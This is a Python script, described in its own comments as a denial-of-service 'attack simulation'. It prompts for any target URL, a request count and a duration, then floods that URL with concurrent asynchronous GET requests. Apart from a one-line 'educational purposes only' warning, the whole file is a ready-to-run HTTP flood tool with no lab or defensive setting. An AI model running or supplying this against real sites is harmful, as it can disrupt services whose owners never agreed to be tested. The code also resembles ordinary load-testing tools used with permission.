import asyncio
import aiohttp
import time
from urllib.parse import urlparse

# Function to send HTTP requests asynchronously
async def send_request(session, target_url, request_count):
    try:
        async with session.get(target_url) as response:
            status = response.status
            print(f"Request {request_count}: Status {status}")
    except Exception as e:
        print(f"Request {request_count} failed: {e}")

# Main attack simulation
async def simulate_dos(target_url, num_requests, duration):
    # Validate URL
    parsed_url = urlparse(target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("Invalid URL. Please include scheme (e.g., http://example.com).")
        return

    print(f"Simulating DoS on {target_url} with {num_requests} requests over {duration} seconds...")

    # Create an aiohttp session
    async with aiohttp.ClientSession() as session:
        tasks = []
        request_count = 0
        
        # Calculate delay between requests to spread them over the duration
        delay = duration / num_requests if num_requests > 0 else 0.1
        
        for i in range(num_requests):
            request_count += 1
            task = asyncio.create_task(send_request(session, target_url, request_count))
            tasks.append(task)
            await asyncio.sleep(delay)  # Spread requests over time
        
        # Wait for all tasks to complete
        await asyncio.gather(*tasks)

# User input and execution
if __name__ == "__main__":
    print("WARNING: This is for educational purposes only. Do not use against real systems without permission.")
    
    # Get user input
    target_url = input("Enter the target URL (e.g., http://example.com): ")
    try:
        num_requests = int(input("Enter the number of requests (e.g., 100): "))
        duration = float(input("Enter the duration in seconds (e.g., 10): "))
    except ValueError:
        print("Invalid input. Using defaults: 100 requests over 10 seconds.")
        num_requests = 100
        duration = 10

    # Run the simulation
    try:
        asyncio.run(simulate_dos(target_url, num_requests, duration))
    except KeyboardInterrupt:
        print("\nStopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")